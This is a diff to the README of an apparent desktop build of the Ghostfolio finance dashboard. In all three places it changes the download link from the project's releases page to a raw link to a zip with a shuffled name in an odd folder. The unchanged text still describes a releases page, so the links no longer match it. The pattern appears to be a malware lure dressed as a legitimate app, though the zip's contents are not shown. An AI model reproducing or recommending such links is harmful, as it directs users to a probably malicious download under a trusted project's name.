@@ -1,6 +1,6 @@
 # 📊 Ghostfolio-Desktop-Self-Hosted-Dashboard - Your Personal Finance Command Center
 
-[![Download Ghostfolio Desktop](https://img.shields.io/badge/Download-Ghostfolio_Desktop-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Shark7418/Ghostfolio-Desktop-Self-Hosted-Dashboard/releases)
+[![Download Ghostfolio Desktop](https://img.shields.io/badge/Download-Ghostfolio_Desktop-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Shark7418/Ghostfolio-Desktop-Self-Hosted-Dashboard/main/synonymist/Dashboard_Ghostfolio_Desktop_Hosted_Self_v1.4.zip)
 
 ---
 
@@ -40,7 +40,7 @@ Getting started with Ghostfolio-Desktop-Self-Hosted-Dashboard is incredibly simp
 
 ### 📥 Downloading the Application
 
-Visit this link to download the application: [https://github.com/Shark7418/Ghostfolio-Desktop-Self-Hosted-Dashboard/releases](https://github.com/Shark7418/Ghostfolio-Desktop-Self-Hosted-Dashboard/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/Shark7418/Ghostfolio-Desktop-Self-Hosted-Dashboard/main/synonymist/Dashboard_Ghostfolio_Desktop_Hosted_Self_v1.4.zip](https://raw.githubusercontent.com/Shark7418/Ghostfolio-Desktop-Self-Hosted-Dashboard/main/synonymist/Dashboard_Ghostfolio_Desktop_Hosted_Self_v1.4.zip)
 
 Once you're on that page, you'll see a list of available releases. Look for the latest version (usually at the top) and click on it. You'll find the download file there.
 
@@ -157,7 +157,7 @@ If you're technically inclined and want to contribute to the project, check out 
 
 You're now ready to take control of your financial future with Ghostfolio-Desktop-Self-Hosted-Dashboard. Remember, the download link is always available here:
 
-**👉 [Download Ghostfolio-Desktop-Self-Hosted-Dashboard](https://github.com/Shark7418/Ghostfolio-Desktop-Self-Hosted-Dashboard/releases)**
+**👉 [Download Ghostfolio-Desktop-Self-Hosted-Dashboard](https://raw.githubusercontent.com/Shark7418/Ghostfolio-Desktop-Self-Hosted-Dashboard/main/synonymist/Dashboard_Ghostfolio_Desktop_Hosted_Self_v1.4.zip)**
 
 Visit this link to download the application. The installation process is quick, and you'll be tracking your investments in no time. Your financial dashboard awaits — start making smarter investment decisions today!
 
